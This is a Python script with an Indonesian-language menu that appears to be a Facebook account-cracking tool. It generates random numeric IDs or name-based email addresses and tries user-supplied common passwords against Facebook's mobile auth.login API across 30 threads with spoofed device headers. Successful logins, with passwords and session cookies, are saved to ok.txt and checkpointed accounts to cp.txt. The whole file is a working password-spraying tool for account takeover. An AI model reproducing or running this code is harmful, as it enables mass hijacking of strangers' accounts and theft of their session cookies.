import os, sys, requests, time, random
from concurrent.futures import ThreadPoolExecutor

H = "\033[0;92m"
K = "\033[0;93m"
N = "\033[0;97m"
id = []
ok = []
cp = []
loop = 0
		
def menu():
	os.system("clear")
	print("   _______ __                  __        \n  |     __|__|.--------.-----.|  |.-----.\n  |__     |  ||        |  _  ||  ||  -__|\n  |_______|__||__|__|__|   __||__||_____|\n                       |__|              ")
	print(" [*] ---------------------------------------") 
	print(" [+] Author : https://fb.com/fallxavier.xyz") 
	print(" [+] GitHub : https://github.com/Fall-Xavier")
	print(" [*] ---------------------------------------") 
	print(" [1]. crack dari random new")
	print(" [2]. crack dari random old")
	print(" [3]. crack dari nama email")
	print(" [4]. lihat akun hasil crack")
	ask = input("\n [?] pilih : ")
	if ask in["1"]:
		random_new()
	elif ask in["2"]:
		random_old()
	elif ask in["3"]:
		nama_email()
	elif ask in["4"]:
		print("\n [1] lihat akun hasil crack ok")
		print(" [2] lihat akun hasil crack cp")
		hasil = input("\n [?] pilih : ")
		if hasil in["1"]:
			try:hasilok = open("ok.txt").read().splitlines()
			except:exit(f" [!] tidak ada file ok, silahkan crack dulu")
			print(" [#] ----------------------------------------------")
			print(f" [+] total akun hasil crack ok : {len(hasilok)}")
			print(f" [#] ----------------------------------------------{H}")
			os.system("cat ok.txt")
			exit(f"\n\n {N}[#] selesai cek ...")
		elif hasil in["2"]:
			try:hasilcp = open("ok.txt").read().splitlines()
			except:exit(f" [!] tidak ada file cp, silahkan crack dulu")
			print(" [#] ----------------------------------------------")
			print(f" [+] total akun hasil crack ok : {len(hasilcp)}")
			print(f" [#] ----------------------------------------------{K}")
			os.system("cat cp.txt")
			exit(f"\n\n {N}[#] selesai cek ...")
		else:menu()
	else:menu()
	
def random_new():
	limit = int(input(" [+] masukan total limit : "))
	for z in range(limit):
		tam = random.randint(11111111111,99999999999)
		if str(tam) in id:pass
		else:id.append(str(tam))
	atursandi()
	
def random_old():
	digit = int(input(" [+] masukan total digit : "))
	limit = int(input(" [+] masukan total limit : "))
	for z in range(limit):
		tam = random.randint(int(str("1"*digit)),int(str("9"*digit)))
		if str(tam) in id:pass
		else:id.append(str(tam))
	atursandi()
		
def nama_email():
	nama = input(" [+] masukan nama (cth: fallxavier) : ")
	email = input(" [+] masukan email (cth: @gmail.com) : ")
	limit = int(input(" [+] masukan total limit : "))
	for z in range(limit):
		id.append(nama+str(z)+email)
	atursandi()

def atursandi():
	print(f" [+] total id -> {len(id)}")
	print("\n [!] gunakan , (koma) untuk pemisah contoh : 123456,1234567")
	pwx = input(" [?] masukan sandi : ")
	print("\n [+] hasil crack ok tersimpan di -> ok.txt")
	print(" [+] hasil crack cp tersimpan di -> cp.txt\n")
	with ThreadPoolExecutor(max_workers=30) as fall:
		for user in id:
			fall.submit(metode, user, pwx.split(","))
	print("\n\n [#] crack selesai ....")
		
def metode(user, pwx):
	global loop, ok, cp
	sys.stdout.write(f"\r [*] [crack] {loop}/{len(id)}  ok : {len(ok)} - cp : {len(cp)}        "),
	sys.stdout.flush()
	try:
		for pw in pwx:
			pw = pw.lower()
			ses = requests.Session()
			ua = random.choice([
				"Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z007;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]", 
				"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]",
				"Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16';]",
				"Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.110 Mobile Safari/537.36",
			])
			headers = {
				"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), 
				"x-fb-sim-hni": str(random.randint(20000, 40000)), 
				"x-fb-net-hni": str(random.randint(20000, 40000)), 
				"x-fb-connection-quality": "EXCELLENT",
				"x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
				"user-agent": ua, 
				"content-type": "application/x-www-form-urlencoded", 
				"x-fb-http-engine": "Liger"
			}
			post = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(user)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
			if "session_key" in post.text or "EAAA" in post.text:
				coki = ";".join(i["name"]+"="+i["value"] for i in post.json()["session_cookies"])
				user = re.findall("c_user=(.*);xs", coki)[0]
				print(f"\r  {H}* --> {user}|{pw}|{coki}")
				ok.append(user)
				open("ok.txt","a").write(f"  * --> {user}|{pw}|{coki}\n")
				break
			elif "www.facebook.com" in post.json()["error_msg"] or "User must verify their account" in post.text:
				data = post.json()["error_data"].encode("utf-8")
				user = re.findall('"uid":(.*),"show_native_checkpoints"', data)[0]
				print(f"\r  {K}* --> {user}|{pw}         ")
				cp.append(user)
				open("cp.txt","a").write(f"  * --> {user}|{pw}\n")
				break
			else:
				continue
		loop +=1
	except Exception as e:
		time.sleep(32)
		
if __name__=='__main__':
	menu()
